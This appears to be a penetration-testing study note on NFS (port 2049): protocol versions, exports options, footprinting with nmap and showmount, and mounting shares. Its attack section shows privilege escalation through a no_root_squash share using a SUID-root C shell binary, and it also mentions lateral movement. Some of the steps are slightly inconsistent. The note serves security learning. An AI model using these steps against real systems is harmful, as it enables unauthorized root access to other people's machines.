---
title: Port 2049 -  NFS Network File System
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - smb
  - port 2049
  - port 111
  - NFS
  - Network File System
---
# Port 2049 -  NFS Network File System

Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. [NFS](https://en.wikipedia.org/wiki/Network_File_System) is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. 

NFS is an Internet standard that governs the procedures in a distributed file system. While NFS protocol version 3.0 (`NFSv3`), which has been in use for many years, authenticates the client computer, this changes with `NFSv4`. Here, as with the Windows SMB protocol, the user must authenticate.

|**Version**|**Features**|
|---|---|
|`NFSv2`|It is older but is supported by many systems and was initially operated entirely over UDP.|
|`NFSv3`|It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.|
|`NFSv4`|It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.|


NFS is based on the Open Network Computing Remote Procedure Call (ONC-RPC/SUN-RPC) protocol exposed on TCP and UDP ports 111, which uses External Data Representation (XDR) for the system-independent exchange of data. The NFS protocol has no mechanism for authentication or authorization. Instead, authentication is completely shifted to the RPC protocol's options.


## Configuration file

The /etc/exports file contains a table of physical filesystems on an NFS server accessible by the clients. 

The default exports file also contains some examples of configuring NFS shares. First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets.

|**Option**|**Description**|
|---|---|
|`rw`|Read and write permissions.|
|`ro`|Read only permissions.|
|`sync`|Synchronous data transfer. (A bit slower)|
|`async`|Asynchronous data transfer. (A bit faster)|
|`secure`|Ports above 1024 will not be used.|
|`insecure`|Ports above 1024 will be used.|
|`no_subtree_check`|This option disables the checking of subdirectory trees.|
|`root_squash`|Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount.|

We can take a look at the `insecure` option. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.

## Mounting a NFS shared folder

```shell-session
# Share the folder `/mnt/nfs` to the subnet $ip
echo '/mnt/nfs  $ip/24(sync,no_subtree_check)' >> /etc/exports

# Restart the NFS service
systemctl restart nfs-kernel-server 

exportfs
```

We have shared the folder `/mnt/nfs` to the subnet `IP/24` with the setting shown above. This means that all hosts on the network will be able to mount this NFS share and inspect the contents of this folder.

## Footprinting the service

```shell-session
sudo nmap $ip -p111,2049 -sV -sC

# Also, run all NSE NFS scripts
sudo nmap --script nfs* $ip -sV -p111,2049

```

Once we have discovered such an NFS service, we can mount it on our local machine. For this, we can create a new empty folder to which the NFS share will be mounted. Once mounted, we can navigate it and view the contents just like our local system.

```shell-session
# Show Available NFS Shares
showmount -e $ip

# Mounting NFS Share
mkdir target-NFS
sudo mount -t nfs $ip:/ ./target-NFS/ -o nolock
cd target-NFS
tree .

# List Contents with Usernames & Group Names
ls -l mnt/nfs/

# List Contents with UIDs & GUIDs
ls -n mnt/nfs/

# Unmount the shared
sudo umount ./target-NFS
```

By default nfs server has root_squash option on, which makes client access nobody:nogroup. To bypass it, sudo su your user to be root.

## Attacking wrong configured NFS 

When an NFS volume is created, various options can be set:

| Option           | Description                                                                                                                                                                                                                                                                                   |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `root_squash`    | If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set. |
| `no_root_squash` | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.                                                                           |
This configuration can be checked out in the `/etc/exports` file:

```shell-session
cat /etc/exports
```

Enumerate NFS shares in the target:

```
# From the attacking machine
showmount -e $targetIP
```

Output:

```
Export list for 10.129.2.210:
/tmp             *
/var/nfs/general *
```

In the output, the wildcard (`*`) means that the NFS (Network File System) share is exported to all clients, meaning any system can mount the exported directories. 

If we could access the target machine and check the `/etc/exports` we would see something similar to:

```
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

Meaning that remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. 

```
# Mounting NFS Share in our attacking machine
sudo su
mkdir target-NFS
mount -t nfs $ip:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
```

Now, from the target host we will create a binary:

```
# We can create a shell from the target machine:
nano shell.c
```

Content:

```shell-session
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

And from the target machine, we generate the binary:

```shell-session
gcc shell.c -o shell
```

Now, going back to the attacker machine, where we are logged as root, we can copy that binary:

```
cp shell shell2
```

We now **adds the "setuid" (Set User ID) permission** to the `/mnt/shell` binary. 

```shell-session
chmod u+s /mnt/shell
```

Going back to the target machine, when we run the binary we will be root.


We can also use NFS for lateral movement. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the `SUID` of that user and then run the shell via the SSH user.


## More

[https://vk9-sec.com/2049-tcp-nfs-enumeration/](https://vk9-sec.com/2049-tcp-nfs-enumeration/).

